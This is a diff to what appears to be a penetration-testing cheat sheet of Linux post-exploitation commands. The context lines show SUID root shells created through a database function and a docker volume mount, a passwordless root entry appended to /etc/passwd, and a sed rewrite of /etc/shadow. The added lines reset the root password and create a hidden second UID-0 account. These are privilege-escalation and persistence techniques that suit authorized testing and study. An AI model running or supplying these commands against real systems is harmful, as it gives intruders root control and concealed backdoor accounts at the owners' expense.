@@ -436,6 +436,12 @@ select do_system('chown root:root /tmp/sid-shell; chmod +s /tmp/sid-shell');
 echo -e "FROM ubuntu:14.04\nENV WORKDIR /stuff\nRUN mkdir -p /stuff\nVOLUME [ /stuff ]\nWORKDIR /stuff" > Dockerfile && docker build -t my-docker-image . && docker run -v $PWD:/stuff -t my-docker-image /bin/sh -c 'cp /bin/sh /stuff && chown root.root /stuff/sh && chmod a+s /stuff/sh' && ./sh -c id && ./sh
 ```
 
+### Resetting root Password
+
+```bash
+echo "root:spotless" | chpasswd
+```
+
 ### Uploading Files to Target Machine
 
 #### TFTP
@@ -730,6 +736,12 @@ echo 'spotless::0:0:root:/root:/bin/bash' >> /etc/passwd
 
 # Rarely needed, but if you need to add a password to the previously created user by using useradd and passwd is not working. Pwd is "kali"
 sed 's/!/\$6$o1\.HFMVM$a3hY6OPT\/DiQYy4koI6Z3\/sLiltsOcFoS5yCKhBBqQLH5K1QlHKL8\/6wJI6uF\/Q7mniOdq92v6yjzlVlXlxkT\./' /etc/shadow > /etc/s2; cat /etc/s2 > /etc/shadow; rm /etc/s2
+```
+
+### Creating Another root User
+
+```bash
+useradd -u0 -g0 -o -s /bin/bash -p `openssl passwd yourpass` rootuser
 ```
 
 ### Generating OpenSSL Password
